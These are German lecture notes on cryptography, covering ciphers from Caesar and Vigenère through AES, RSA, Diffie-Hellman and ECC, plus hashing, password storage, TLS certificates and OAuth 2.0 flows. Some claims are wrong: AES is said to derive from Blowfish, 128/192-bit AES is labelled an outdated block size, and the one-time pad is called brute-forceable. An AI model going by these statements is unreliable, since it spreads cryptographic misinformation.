# Sicherheit

## Kryptografie

- kryptos: geheim, verborgen
- graphein: schreiben

- Ziel
  - Verschlüsselung

- Alternative
  - Steganografie

> "*M*anche bezweigeln *e*inen Grundsatz *i*n Physik, *n*ämlich dass *N*euorientierung von *a*llen Teilchen *m*it dem *E*inpendeln erfolgt. *G*anz sicher? *O*b wir *l*inks schwingend *o*der eher *r*echts schwingend *o*szillieren, ist *d*och tatsächlich *e*her ziemlich *n*ebensächlich."

- Schlagworte
  - https://de.wikipedia.org/wiki/Cicada_3301
  - https://en.wikipedia.org/wiki/11B-X-1371 (NSFW)
  - https://en.wikipedia.org/wiki/A86_(software)

- Gegenstück
  - Kryptoanalyse

- "Vorurteile"
  - Schwierig / komplex
  - "schon mal gehört"
- Konzepte statt Implementierungen

- Wozu braucht man das?
  - Sensible / sensitive Daten
  - Personenbezogene Daten
  - Privatsphäre
  - Gesetzliche Anforderungen

- Historische Beispiele
  - Beale-Chiffre
    - Anfang des 19. Jahrhunderts
    - 3 Seiten (nur eine konnte entschlüsselt werden)
    - 2. Seite basiert auf der amerikanischen Unabhängigkeitserklärung
    - "Buch-Chiffre"
  - Voynich-Manuskript
    - ~ Mittelalter
    - unentschlüsselt
  - Navajo
    - Deren Sprache wurde als Code verwendet

## Cäsar-Chiffre

- Nachricht ("Klartext", "plain text")
- Verschlüsselung (Algorithmus + Schlüssel)
- Geheimtext ("Chiffre", "cipher text")
- Entschlüsselung (Algorithmus + Schlüssel)
- Klartext

```
Klartext        ABCDEFGHIJKLMNOPQRSTUVWXYZ
                                              -3    <- Schlüssel
Geheimtext      XYZABCDEFGHIJKLMNOPQRSTUVW

HALLO WELT
EXIIL TBIQ <- Geheimtext (-3)
```

- Größe des Schlüsselraums: 25
- Verschlüsselung brechen?
  - Durch einfaches Ausprobieren, maximal 25 Versuche notwendig
  - "Brute Force"

## Verbesserte Cäsar-Chiffre

```
Klartext        ABCDEFGHIJKLMNOPQRSTUVWXYZ
Geheimtext      UGDABEJHCFILTMNOKPWQRVXSZY (durcheinandergewürfelt)

HALLO WELT
HULLN XBLQ
```

- Funktioniert Brute-Force hier auch?
  - Größe des Schlüsselraums berechnen
  - 26 * 25 * 24 * ... * 2 * 1 = 26! => eine sehr große Zahl ;-)
  - Daraus folgt, das ist **deutlich** sicherer als die klassische Cäsar-Chiffre

- Sprachprofil erstellen (zählen, welches Zeichen wie oft vorkommt)
  - Im Deutschen
    - "E" kommt am häufigsten vor
    - "N" kommt am zweithäufigsten vor
    - ...

```
EINE KLEINE ENTE
BCMB ILBCMB BMQB
```

- B: 6 (Vermutung: E)
- C: 2
- M: 3 (Vermutung: N)
- I: 1
- L: 1
- Q: 1

```
BCMB ILBCMB BMQB
E.NE ..E.NE EN.E

=> Raten: C bedeutet wohl I wegen des ersten Wortes

BCMB ILBCMB BMQB
EINE ..EINE EN.E

Und so weiter …
```

- Monoalphabetische Verschlüsselungen
  - Bilden 1 Alphabet auf 1 anderes Alphabet ab
  - Relativ unsicher, unabhängig von der Größe des Schlüsselraums
  - "Sprachprofil" kann verwendet werden
    - Muster aus dem Klartext finden sich auch im Geheimtext
    - Idee: Muster suchen, um Rückschlüsse auf den Klartext ziehen zu können

## ROT13

- Cäsar mit Schlüssel 13
  - "Rotiert" an der Hälfte des Alphabets
  - ROT13, ist quasi Cäsar mit hartcodiertem Schlüssel 13

## Vigenère-Chiffre

- ~ 16. Jahrhundert
- Idee: Polyalphabetische Verschlüsselung

```
Klartext        ABCDEFGHIJKLMNOPQRSTUVWXYZ
                                              Schlüssel "DIE" (4, 9, 5)
Geheimtext +4   EFGHIJKLMNOPQRSTUVWXYZABCD
Geheimtext +9   JKLMNOPQRSTUVWXYZABCDEFGHI
Geheimtext +5   FGHIJKLMNOPQRSTUVWXYZABCDE

HALLO WELT
LJQPX BIUY

EINE KLEINE ENTE
IRSI TQIRSI NSXN
```

- Das heißt, es wird besser, aber nicht perfekt
  - Muster *können* immer noch auftreten
  - Problematisch: Buchstabenabstände entsprechen der Schlüssellänge
- Je länger der Schlüssel, und je vielfältiger der Schlüssel, desto besser
- https://de.wikipedia.org/wiki/Zodiac-Killer

## One-time pad (OTP)

- Mathematisch nachweisbar unknackbar
- Die "perfekte" Verschlüsselung

```
Klartext        ABCDEFGHIJKLMNOPQRSTUVWXYZ
Geheimtext #1   HIJKLMNOPQRSTUVWXYZABCDEFG     +7
Geheimtext #2   DEFGHIJKLMNOPQRSTUVWXYZABC     +3
Geheimtext #3   IJKLMNOPQRSTUVWXYZABCDEFGH     +8
Geheimtext #4   ABCDEFGHIJKLMNOPQRSTUVWXYZ     +0
Geheimtext #5   QRSTUVWXYZABCDEFGHIJKLMNOP     +16

Klartext      HALLO
Geheimtext    ODTLE
```

- Häufigkeitsanalyse funktioniert nicht, weil Schlüssel zufällig gebildet
- Größe des Schlüsselraums
  - 26^5 = 11.881.376
  - => Brute-Force sollte möglich sein, da überschaubare Anzahl von Schlüsseln

- Anforderungen
  - Schlüssel **muss** zufällig sein
  - Schlüssel muss so lang sein wie der Klartext
  - Schlüssel darf nur ein einziges Mal verwendet werden

- Probleme
  - Wo kommen die zufällig generierten Schlüssel her?
  - Wie funktioniert der Schlüsseltausch?
  - Wie und wo bewahrt man die Schlüssel auf?

## Zufall

- Siehe `rng.ts`
- Starten über `npm run rng`

- PRNG
  - Pseudo random number generator
  - `math.random()` in JavaScript
  - `rand.Int()` in Go
- CSRNG
  - Cryptographically secure random number generator
  - `crypto.randomBytes()` in Node.js

## Block-Chiffren

```
HALLO WELT

=> Blöcke bilden mit einer Länge von 16 Bit

"HA", "LL", "O ", "WE", "LT"
```

- Im Prinzip arbeiten die ähnlich zu den Verfahren, die wir schon kennen
- Hauptunterschied ist, dass sie auf Blöcken und nicht auf einzelnen Zeichen arbeiten

- Bekannte Verfahren
  - RC4 (veraltet)
  - DES (Data Encryption Standard, veraltet)
  - 3DES (Triple DES, veraltet)
  - AES (Advanced Encryption Standard, basiert auf Rijndael und Blowfish)
    - Verschiedene Blockgrößen
      - 128 Bit (veraltet)
      - 192 Bit (veraltet)
      - 256 Bit
    - Verschiedene Modi
      - ECB (Electronic Codebook, veraltet)
      - CBC (Cipher Block Chaining)
      - Und viele weitere …

- zB "AES-256-CBC"

```
DASISTEINHALLOWELTPROGRAMM

1. Schritt: Blöcke bilden (beispielsweise mit 32 Bit, wären eigentlich 256 Bit)
DASI STEI NHAL LOWE LTPR OGRA MM

2. Schritt: Padding hinzufügen (falls notwendig, von rechts gelesen)
DASI STEI NHAL LOWE LTPR OGRA MM_2

3. Schritt (stark vereinfacht): Blockweise verschlüsselt
FTHB VJZT LISW BZUB FTUZ ZUKG FTZU

------

ECB-Modus:

TICK TRICK UND TRACK

1. Schritt: Blöcke bilden (beispielsweise mit 16 Bit, wären eigentlich 256 Bit)
TI CK _T RI CK _U ND _T RA CK

2. Schritt: Padding hinzufügen
TI CK _T RI CK _U ND _T RA CK _2

3. Schritt (stark vereinfacht): Blockweise verschlüsseln
NZ RT BL WE RT CV UI BL ZU RT NN
   ^^       ^^             ^^
      ^^             ^^

=> ECB funktioniert zwar, ist aber nicht besonders gut und anfällig für Angriffe, weil Muster aus dem Klartext im Geheimtext erhalten bleiben

------

CBC-Modus:

Klartext          TICK TRICK UND TRACK

1. Schritt: Blöcke bilden (beispielsweise mit 16 Bit, wären eigentlich 256 Bit)
TI CK _T RI CK _U ND _T RA CK

2. Schritt: Padding hinzufügen
TI CK _T RI CK _U ND _T RA CK _2

3. Schritt: Initialisierungsvektor (IV) hinzufügen (zufällig gewählt!)
Klartext        TI CK _T RI CK _U ND _T RA CK _2
Geheimtext   BW

4. Schritt (stark vereinfacht): Blockweise verschlüsseln, aber wir kombinieren jeden Block mit seinem direkten Vorgängerblock
Klartext        TI CK _T RI CK _U ND _T RA CK _2
Geheimtext   BW SJ ZU RT BL WE ...

a) Block 1: AES(TI XOR BW) => SJ
b) Block 2: AES(CK XOR SJ) => ZU
c) Block 3: AES(_T XOR ZU) => RT
d) Block 4: AES(RI XOR RT) => BL
e) Block 5: AES(CK XOR BL) => WE
f) ...
```

## Verschlüsselt != fälschungssicher

```
HALLO
          Cäsar +1
IBMMP

IBMMP ---> Ändert Text ----> IFMMP ----> entschlüsselt ----> HELLO
```

- David Kriesel: "Trau keinem Scan, den Du nicht selbst gefälscht hast"
  - https://www.youtube.com/watch?v=7FeqF1-Z1g0

## Schlüsseltausch (Diffie-Hellmann Key-Exchange Verfahren)

- Standardisierte Rollen in der Kryptografie
  - Sender: Alice
  - Empfänger: Bob
  - Drittes: Eve

```
Alice                                                 Bob
  |                                                    |
  +---------------------> gelb <-----------------------+
  |                                                    |
  +--> rot                                     blau <--+
  |                                                    |
  +--> gelb+rot                           gelb+blau <--+
      = orange                              = grün
          |                                     |
          +-------------------------------------)------> gelb, blau, grün, orange
                                                |
gelb, rot, orange, grün <-----------------------+

         grün + rot => ocker                  orange + blau => ocker
(gelb + blau) + rot => ocker            (gelb + rot) + blau => ocker


                          Eve

                  Gemeinsame Farbe: gelb
                  Mischfarbe (Alice): orange
                  Mischfarbe (Bob): grün

                    orange + grün => nicht ocker
              (gelb + rot) + (gelb + blau)
               gelb + rot + gelb + blau
               gelb + gelb + rot + blau
              gelb + (gelb + rot + blau)
```

### Mathematische Version

```
Alice                                               Bob
                            g = 5
                            p = 7

s(private)                                          t(private)
S(public) = g ^ s mod p                             T(public) = g ^ t mod p
   => 6                                                => 6

(g ^ t mod p) = 6                                   (g ^ s mod p) = 6
(g ^ t mod p) ^ s mod p                             (g ^ s mod p) ^ t mod p
 6            ^ s mod 7                              6            ^ t mod 7

                  Gemeinsames (geheimes) Ergebnis: 6


                        y = ((g ^ s mod p) ^ t mod p)
                        y = ((g ^ t mod p) ^ s mod p)


Alle wissen:

g ^ t mod p = 6
5 ^ t mod 7 = 6

Was Eve machen *müsste*:

5 ^ t mod 7 = 6      <- Potenzrechung (aber halt mit Modulo …)
t = log5(6) mod 7    <- Diskrete Logarithmus (nur sehr schwer berechenbar)
```

## Hash-Funktionen

- `hashFn(message) => hashValue`
- Eigenschaften
  - Berechnet stets gleich große Hash-Werte, unabhängig von der Nachricht
  - Einwegfunktion (Nachricht kann nicht aus Hash-Wert wiederhergestellt werden)
  - Geringfügig unterschiedliche Nachrichten führen zu deutlich unterschiedlichen Hash-Werten
  - Kollisionen sind nicht unmöglich, sollten aber nicht einfach herstellbar sein
    - Mit anderen Worten: Es sollte unmöglich sein, gezielt eine Nachricht zu einem gegebenen Hash-Wert zu erstellen

- Anschauliches Beispiel: Quersumme
  - 3141526 => 4
  - 3147526 => 1

- Algorithmen
  - MD5 (Message Digest, veraltet)
  - SHA1 (Secure Hash Algorithm, veraltet)
  - SHA2
    - SHA-224 (selten)
    - SHA-256 (<--)
    - SHA-384 (selten)
    - SHA-512 (<--)
  - SHA3 (kaum unterstützt)

- Hash = Digitaler Fingerabdruck
  - Nachricht: HALLO WELT
  - Verschlüsseln: IBMMP XFMU
  - Hash berechnen: sha256(HALLO WELT) => 8611d7193c6fc0f23a7d9b0ce5341ec5154877759516c0c0917e1890c627de92
- Ermöglicht das Prüfen der Integrität von Daten

## Passwörter speichern

```
Login     Password
------------------------
jane      secret
joe       qwertz123

---

Login     Hash(Password)
------------------------
jane      g467gfuz4q3g76
joe       f43t68f43gf873

Angriff #1: Vorberechnete Hash-Tabellen (Rainbow Tables)
Angriff #2: Zwei Personen, gleiches Passwort => gleicher Hash

---

Login     Salt     Hash(Salt+Password)
--------------------------------------
jane      g6og     fgufegwuzfguz
joe       v436     4367gd4zg4ceg

---

Login     Salt     Hash(Hash(Salt+Password))
--------------------------------------------
jane      g6og     hf8h478hgp348
joe       v436     fh3478fgh478q

---

Login     Salt     Alg     #Iteration    Hash(...(Hash(Salt+Password)))
-----------------------------------------------------------------------
jane      g6og     sha256  10000         hf8h478hgp348
joe       v436     sha224  3000          fh3478fgh478q
```

- Spezifische Algorithmen für das Passwort-Hashing
  - pbkdf2 (Password-based key derivation function v2)
  - bcrypt
  - scrypt

## MAC (Message Authentication Code)

```
Alice                                            Bob

HALLO WELT ------------------------------------> HALLO WELT
hash: 67234gd4736 -----------------------------> ok
hash(HALLO WELT)

Schutz vor Übertragungsfehlern


Alice                                            Bob

HALLO WELT -------------A>E--------------------> HELLO WELT
hash: 67234gd4736 -------!---------------------> vermeintlich (!) alles ok
hash(HALLO WELT)         ^ hash(HELLO WELT)
                         |
                        Eve

Kein Schutz vor Manipulation, da auch Hash manipuliert werden kann


Alice                                            Bob

DHKE -------------------> secret <-------------- DHKE

HALLO WELT --------------A>E-------------------> HELLO WELT
hash: fg468fg4gfg --------?--------------------> Manipulation!
hash(HALLO WELT+secret)   ^
                          |
                         Eve

Schutz vor Übertragungsfehlern + Manipulation
```

- Standardisierte Algorithmen
  - HMAC (Hash-based Message Authentication Code)

## Schlüsselaustausch

```
Alice <-------------> Bob
  ^              --->
  |        /----/
  v  <----/
 Eve                 Mallory
```


- Schlüsselzahl nach Personen
  - 2 Personen: 1 Schlüssel
  - 3 Personen: 3 Schlüssel (+2)
  - 4 Personen: 6 Schlüssel (+3)
  - 5 Personen: 10 Schlüssel (+4)

- Berechnen
  - n Personen: 1 + 2 + 3 + 4 + ... + n-1
  - Allgemeine Summenformel
    - Summe(1...n) = n * (n+1) / 2
  - n Personen: Summe(1...n-1) = (n-1) * n / 2
  - ZB für 17 Personen: 16 * 17 / 2 = 136 (!) Schlüssel

- Aufwand für den Schlüsselaustausch und auch Anzahl der Schlüssel steigt ungefähr quadratisch mit der Anzahl der Personen

- Ziele
  - Weniger Schlüssel
  - Effizienter ad-hoc-Austausch von Schlüsseln

## Asymmetrische Verschlüsselung

- Ablauf
  - Bob kauft ein Vorhängeschloss (inklusive Schlüssel)
  - Alice fordert von Bob ein Vorhängeschloss an
  - Alice verfasst Nachricht, packt die Nachricht in eine Kiste und verschließt die Kiste mit dem Vorhängeschloss
  - Alice schickt die Kiste an Bob
  - Bob öffnet die Kiste mit dem Vorhängeschloss
- Komponenten
  - Bauplan für Schlösser (Algorithmus)
  - Schlüssel (privat)
  - Schloss (öffentlich)

## RSA

- Algorithmus (Ron Rivest, Adi Shamir, Leonard Adleman)
- Unternehmen (RSA Security)

- Ablauf des Algorithmus
  - Zwei Primzahlen wählen: `p` und `q`
  - Modulus `N`berechnen: `N = p * q`
  - Phi-Funktion (von Euler): `phi(N) = (p-1) * (q-1)`
  - Zahl `e` wählen, so dass sie teilerfremd zu `phi(N)` ist
  - Verschlüsseln: `c = m^e mod N` (m = message, c = ciphertext)
  - Entschlüsseln: `m = c^d mod N` (d = private key)
  - `d` berechnen
    - `d` muss zu `e` passen: `d` und `e` müssen sich gegenseitig aufheben
    - Das heißt, `d * e = 1 mod phi(N)`
    - Sicherheit von RSA basiert auf der Schwierigkeit, phi(N) zu berechnen, ohne p und q zu kennen (und die wiederum sind schwer zu berechnen, da die Faktorisierung von N schwierig ist)
  - Erweiterter Euklidischen Algorithmus

- Beispiel
  - Bob bereitet vor
    - `p = 7` und `q = 11` (geheim)
    - `N = 7 * 11 = 77`
    - `phi(N) = (7-1) * (11-1) = 6 * 10 = 60`
    - `e = 13`
    - Öffentliche Schlüssel ist `(N, e)` = `(77, 13)`
  - Alice (oder sonstjemand) verschlüsselt mit den öffentlichen Zahlen von Bob
    - `m = 42` => 42 ^ 13 mod 77 = 14 => `c`
    - Zwischenergebnis: Nachricht `m = 42` ergibt Geheimtext `c = 14`
  - Bob berechnet seinen privaten Schlüssel `d`
    - Gegeben: phi(N) = 60, e = 13
    - Euklid:

```
phi(N)    e
 |        |
 v        v
60 = 4 * 13 + 8
         ^    ^
  /-----/  /-/
 v        v
13 = 1 * 8 + 5
         ^   ^
  /-----/ /-/
 v       v
 8 = 1 * 5 + 3
 5 = 1 * 3 + 2
 3 = 1 * 2 + 1
 2 = 2 * 1 + 0 (die letzte Zeile ignorieren wir)


 1 = 3 - 1 * 2 (vorletzte Zeile, aufgelöst zum Rest)
 1 = 3 - 1 * (5 - 1 * 3)
 1 = 2 * 3 - 1 * 5
 1 = 2 * (8 - 1 * 5) - 1 * 5
 1 = 2 * 8 - 3 * 5
 1 = 2 * 8 - 3 * (13 - 1 * 8)
 1 = 5 * 8 - 3 * 13
 1 = 5 * (60 - 4 * 13) - 3 * 13
 1 = 5 * 60 - 23 * 13
          ^         ^
          |         |
        phi(N)      e

 d = -23
```

    - c = 14, d = -23 (=37 (mod phi(N))), N = 77
    - m = c^d mod N
    - m = 14^37 mod 77 => 42

- Vorteile von RSA
  - Deutlich weniger Schlüssel werden benötigt
  - Schlüsselaustausch kann öffentlich erfolgen
- Nachteile von RSA
  - Sehr langsam (~ Faktor 10.000 langsamer als AES)
  - Nachrichtenlänge drastisch begrenzt (durch Schlüssellänge)
  - Schlüssel sind sehr lang (1024 Bit, 2048 Bit, 4096 Bit)
  - Primfaktorzerlegung ist nicht mehr so unlösbar wie sie das mal war

## Digitale Signaturen

```
m = (m ^ e mod N) ^ d mod N = m ^ e*d mod N
                            = m ^ d*e mod N
```

- Erkenntnis
  - Man kann mit öffentlichem Schlüssel verschlüsseln und mit privatem entschlüsseln
  - Man kann mit privatem Schlüssel verschlüsseln und mit öffentlichem entschlüsseln

```
Alice -> m -> prvA(m) -> signedM -> pubB(signedM) -> encryptM -> Bob

Bob -> encryptM -> prvB(encryptM) -> signedM -> pubA(signedM) -> m
```

- Digitale Signaturen funktionieren haargenau so wie asymmetrische Verschlüsselung, es werden lediglich die Rollen von dem öffentlichen und dem privaten Schlüssel vertauscht

## Hybrid-Verfahren

```
Alice -> m
      -> erfindet zufälligen AES-Schlüssel
      -> AES(m, aesKey)
      -> SHA256(m)
      -> RSA(hash, privateKey(Alice))
      -> RSA(aesKey, publicKey(Bob))
```

- Eigentliche Nachricht effizient mit AES und Zufallsschlüssel verschlüsseln
- AES-Schlüssel und Hash mit RSA signieren und verschlüsseln
  - Das kann man n Mal parallel machen, um eine Nachricht zB an verschiedene Empfänger:innen gleichzeitig zu verschicken

## Elliptische Kurven (EC)

- ECC = Elliptic Curve Cryptography

```
Lineare Funktionen:
  y = m * x + b

Quadratische Funktionen:
  y = a*x^2 + b*x + c

Kubische Funktionen:
  y = a*x^3 + b*x^2 + c*x + d

Elliptische Kurven:
  y^2 = x^3 + a*x + b         | sqrt()
  y   = sqrt(x^3 + a*x + b)   => 2 (!) Lösungen, ein positives und ein negatives

```

- Form der elliptischen Kurve hängt im Wesentlichen von den Koeffizienten a und b ab

- Vorgehen
  - Alice wählt einen Startpunkt `P` auf der Kurve
  - Alice überlegt sich einen geheimen Faktor `a`
  - Alice konstruiert einen Punkt `a*P`
  - Dieser Punkt hat eine X-Koordinate, diese nennen wir `A`
    - `A` ist der öffentliche Schlüssel von Alice
    - `a` ist der private Schlüssel von Alice
  - Bob macht das gleiche (vom gleichen Punkt `P` ausgehend)
  - Bob überlegt sich einen geheimen Faktor `b``
  - Bob konstruiert einen Punkt `b*P`
  - Dieser Punkt hat eine X-Koordinate, diese nennen wir `B`
    - `B` ist der öffentliche Schlüssel von Bob
    - `b` ist der private Schlüssel von Bob
  - Gemeinsamer Schlüssel
    - `a * b * P`
    - Das ist für Alice leicht: `a * B` = `a * (b * P)`
    - Das ist für Bob leicht:   `b * A` = `b * (a * P)`
  - Für Eve
    - Eve kann den gemeinsamen Schlüssel nicht (effizient) berechnen
    - Dafür bräuchte sie `a` und `b`
  - Das ist ECDH: Elliptic-Curve Diffie-Hellman

```
227P = P + P + P + P + ... + P    (227 Mal)
227P = 128P + 64P + 32P + 2P + 1P (deutlich weniger Aufwand)
```

## Grundbausteine

- Symmetrische Verschlüsselung
  - Monoalphabetische Verfahren (Cäsar, ROT13, Erweiterter Cäsar)
  - Polyalphabetische Verfahren (Vigenère, Zodiac)
  - One-Time Pad
  - Block-basierte Verfahren (AES-CBC, AES-ECB)
- Asymmetrische Verschlüsselung
  - RSA, Elliptische Kurven
  - Digitale Signaturen
- Zufallszahlengeneratoren
- Schlüsselaustausch (Diffie-Hellman, ECDH)
- Hash-Funktionen (SHA2-Familie)
- MAC (HMAC)
- Passwörter speichern (pbkdf2, bcrypt, scrypt)

## HTTPS

- HTTPS = HTTP over TLS
  - TLS = Transport Layer Security
  - SSL = Secure Sockets Layer (alter Name für TLS)
- Zwei Zielsetzungen
  - Verbindung soll verschlüsselt sein (Vertraulichkeit)
  - Verbindung soll authentifiziert sein (Authentifikation)
    - Man in the Middle (MITM) Angriffe vermeiden / verhindern

```
Client (vkb.de) -----------------> Server (vkb.de)
- RootCA-Zertifikat                 - Private Key
                                    - Zertifikat
                                      - Public Key
                                      - Domain: vkb.de
                                      - Gültig bis: 11/2023
                                      - CA: CA#1
                                      - CA-Zertifikat:
                                        - Public Key
                                        - Domain: ca1.com
                                        - Gültig bis: 11/2027
                                        - CA: CA#2
                                        - CA-Zertifikat:
                                          - Public Key
                                          - Domain: ca2.com
                                          - Gültig bis: 11/2032
                                          - CA: RootCA
                                          - CA-Zertifikat:
                                            - Public Key
                                            - Domain: rootca.com
                                            - CA: RootCA
                                            - Digitale Signatur
                                          - Digitale Signatur
                                        - Digitale Signatur
                                      - Digitale Signatur <-----+
                                                                |
                                   Certificate Authority (CA#1) |
                                   - Private Key ---------------+
                                   - Zertifikat
                                     - Public Key
                                     - Domain: ca1.com
                                     - Gültig bis: 11/2027
                                     - CA: CA#2
                                     - Digitale Signatur <-------+
                                                                 |
                                   Certificate Authority (CA#2)  |
                                   - Private Key ----------------+
                                   - Zertifikat
                                     - Public Key
                                     - Domain: ca2.com
                                     - Gültig bis: 11/2032
                                     - CA: RootCA
                                     - Digitale Signatur <-------+
                                                                 |
                                   Root Certificate Authority    |
                                   - Private Key ----------------+
                                   - Zertifikat
                                     - Public Key
                                     - Domain: rootca.com
                                     - CA: RootCA
                                     - Digitale Signatur
```

- Für die lokale Entwicklung
  - Zertifikat für `localhost` benötigt
  - Zertifikat für `staging.vkb-internal.local`
- Ein Zertifikat anfordern
  - Private Key erstellen
  - Public Key erstellen
  - Bestellformular für Zertifikat ausstellen (Certificate Signing Request (CSR))
    - Public Key
    - Metadaten (Domain, Inhaber, …)
  - Optionen
    - CSR an CA schicken, Geld bezahlen, warten, Zertifikat bekommen :-)
    - CSR selbst in ein Zertifikat umwandeln und selbst unterschreiben
      - Self-Signed Certificate
        - Technisch ist das ein legitimes Zertifikat
        - Aber es wird nicht als vertrauenswürdig eingestuft

## Partial Keys

- Man hat ein Secret
  - Möchte aber, dass mehrere Personen den Vorgang gemeinsam freischalten müssen
  - Man braucht mehr als 1 Passwort, man hat also N Passwörter
  - Aber man braucht nicht alle N Passwörter, um den Vorgang freizuschalten

- Konzeptionell

```
Passwort: secret

# Personen:            3
# Passwörter benötigt: 2

s _ c r _ t     _ e c _ e t     s e _ r e _
    #1               #2              #3
```

- Mathematisch
  - Secret: `Y`
  - Öffentlich: `X`

- Lineare Funktion (<- wenn zwei Personen genügen sollen)
  - y = m*x + b
  - Kann durch zwei Punkte genau bestimmt werden
  - Ich brauche mindestens zwei Punkte => wenn jede Person einen Punkt kennt, genügen zwei Personen

- Quadratische Funktion (<- wenn drei Personen genügen sollen)
  - y = a*x^2 + b*x + c
  - Kann durch drei Punkte genau bestimmt werden
  - Ich brauche mindestens drei Punkte => wenn jede Person einen Punkt kennt, genügen drei Personen

- Allgemein
  - Wenn n Personen genügen sollen, braucht man ein Polynom vom Grad n-1

- Algorithmus dafür
  - Von Adi Shamir
  - "Shamir's Secret Sharing"

## OAuth 2.0

- Authorisierungsframework
- Outsourced, _was_ ein user tun darf
- eine sammlung von Spezifikationen
- Outsourcen sorgt dafür
  - dass Unternehmen mit mehr Expertise die security machen => geringeres Risiko eines Datenleaks
  - gibt juristische Sicherheit => Vertrag mit einem Securityanbieter

### Begriff

- Client
  - third-party Anwendung, die auf Daten zugreifen möchte
- Resource Owner
  - juristische person, die zugriff auf daten, die ihr gehören, erteilen kann
- OAuth Provider == Authorization Server
  - gibt auf anweisung des Resource Owners zugriffsrechte an Client raus
- Resource Server
  - verwaltet daten und gibt diese an authorisierte Clients raus

### Der Authorisierungsprozess

- Ich möchte eine Anwendung benutzen, die meine Daten verarbeitet
- Ich starte die Anwendung
- Die Anwendung leitet mich weiter zu meinem OAuth Provider
- OAuth Provider fragt mich, ob die Anwendung auf meine Daten zugreifen darf
  - dazu muss ich mich gegebenenfalls beim OAuth Provider einloggen
  - _wie genau_ der OAuth provider das tut, ist ihm überlassen
    - es _kann_ authentifizierung sein
    - es kann aber auch sein, dass ein user nur im selben netzwerk sein muss o.ä.
    - die authorisierung sagt nichts über die identität des Resource Owners aus
- Ich sage zu, dass die Anwendung auf meine Daten zugreifen darf
- Der OAuth Provider leitet mich zurück zur Anwendung (mit security details)
- Die Anwendung hat jetzt die Möglichkeit, meine Daten abzufragen
- Die Anwendung schickt eine Anfrage an einen Resource Server und kriegt meine Daten

### Vorbedingungen für OAuth

- ALLES ÜBER HTTPS
- Der Client (die third-party Anwendung) muss beim Authorization Server regstriert werden
  - Client ID
  - Client Secret
  - Redirect URI (z.B. https://meinecoolephotobearbeitungsapp.com/cb)

### Authorization Code Flow

- Der Client erstellt einen "Log In"-Link, der den Resource Owner zum Authorization Server weiterleitet
```
https://authorization-server.com/auth?
	response_type=code&
	client_id=CLIENT_ID&
	redirect_uri=REDIRECT_URI&
	scope=photos&
	state=1234zyx
```
- Der Authorization Server fragt den Resource Owner (also den User, der vor dem PC sitzt), ob die Client auf die angegebenen Scopes zugreifen darf
- Der Authorization Server leitet den Resource Owner zurück zur Anwendung und schickt einen Authorization Code mit
```
https://meinecoolephotobearbeitungsapp.com/cb?
	code=AUTH_CODE_HERE&
	state=1234zyx
```
- Der Client verifiziert, dass der `state` query parameter identisch zu dem ist, den er ursprünglich abgeschickt hat (eher eine nonce)
- Der Client schickt einen POST request an den Token Endpoints des Authorization Servers und schickt den Authorization Code mit
```
POST https://authorization-server.com/token
	grant_type=authorization_code&
  code=AUTH_CODE_HERE&
  redirect_uri=REDIRECT_URI&
  client_id=CLIENT_ID&
  client_secret=CLIENT_SECRET
```
- Der Authorization Server antwortet mit einem Access Token und einer Expiration Time
```
{
  "access_token":"2YotnFZFEjr1zCsicMWpAA",
  "expires_in":3600,
  "refresh_token":"tGzv3JOkF0XG5Qx2TlKWIA"
}
```
- Der Client kann jetzt Requests an Resource Server schicken
```
POST https://resource-server.com/some-data
HEADER Authorization: Bearer ...
```

### Refresh Codes

- Der Client schickt einen Refresh Request an den Token Endpoint
```
POST https://authorization-server.com/token
  grant_type=refresh_token&
  refresh_token=tGzv3JOkF0XG5Qx2TlKWIA
```
- Der Authorization Server antwort mit einem neuen Access Token und Refresh Token
```
{
  "access_token":"...",
  "expires_in":3600,
  "refresh_token":"..."
}
```

### Implicit Flow

- Der Authorization Request gibt beim Redirect zurück zum Client direkt ein Access Token mit
- Sollte nicht verwendet werden, da es weniger sicher ist als die folgende Erweiterung für SPAs und Mobile Apps

### Erweiterung des Authorization Code Flow für Single-Page-Applications und Mobile Apps

- SPAs & Mobile Apps können keinen Secrets bewahren

- Der Client erstellt einen "Log In"-Link, der den Resource Owner zum Authorization Server weiterleitet, und hängt dabei ein generiertes Secret an, das einmalig verwendet wird
  - Dazu generiert der Client einen random String, genannt der Code Verifier, 43-128 characters lang
  - Dann hashed der Client diesen random String und encoded ihn URL-Safe (base64) => Code Challenge
```
https://authorization-server.com/auth?
	response_type=code&
	client_id=CLIENT_ID&
	redirect_uri=REDIRECT_URI&
	scope=photos&
	state=1234zyx&
  code_challenge=...&
  code_challenge_method=S256
```
- Der Authorization Server merkt sich die Code Challenge im Hintergrund
- Der Authorization Server fragt den Resource Owner (also den User, der vor dem PC sitzt), ob die Client auf die angegebenen Scopes zugreifen darf
- Der Authorization Server leitet den Resource Owner zurück zur Anwendung und schickt einen Authorization Code mit
```
https://meinecoolephotobearbeitungsapp.com/cb?
	code=AUTH_CODE_HERE&
	state=1234zyx
```
- Der Client schickt einen POST request an den Token Endpoints des Authorization Servers und schickt den Authorization Code mit
```
POST https://authorization-server.com/token
	grant_type=authorization_code&
  code=AUTH_CODE_HERE&
  redirect_uri=REDIRECT_URI&
  client_id=CLIENT_ID&
  code_verifier=...
```
- Der Authorization Server wendet den Algorithmus aus der `code_challenge_method` um den Code Verifier mit der Code Challenge zu vergleichen
- Der Authorization Server antwortet mit einem Access Token und einer Expiration Time
```
{
  "access_token":"2YotnFZFEjr1zCsicMWpAA",
  "expires_in":3600,
  "refresh_token":"tGzv3JOkF0XG5Qx2TlKWIA"
}
```
- Der Client kann jetzt Requests an Resource Server schicken
```
POST https://resource-server.com/some-data
HEADER Authorization: Bearer ...
```

### Praktische Probleme

- Registration von Clients ist nicht standardisiert
  - Austausch des Client Secrets ist nicht standardisiert
  - Kein Problem für die Security, aber nervig für Ops
- Oft erwarten Authorization Provider zusätzliche Dinge über den Spec hinaus
  - Man braucht eine Implementation pro OAuth Provider, um alles abzudecken
  - Führt natürlich zu Overhead in der Implementation
  - Das Problem hat man nicht, wenn man einen zentralen Authorization Provider verwendet
    - Das ist in der Praxis meist der Fall, weil man ein Set von Nutzern (Angestellte, Kund:innen) an einer Stelle verwalten möchte
    - Man sollte für getrennte Nutzerbasen möglichst die selbe Software für den Authorization Provider benutzen, um nicht mehrere verschiedene Integrationen entwickeln zu müssen
- Es ist nicht standardisiert, wie der Authorization Server den Authorization Request validiert
  - Es gibt z.B. nicht-standard protokolle (meineapp://...)
  - Manche Authorization Server verbieten Requests an localhost
  - Die Validierung der Redirect URI ist manchmal ein ===, manchmal ein glob/regex
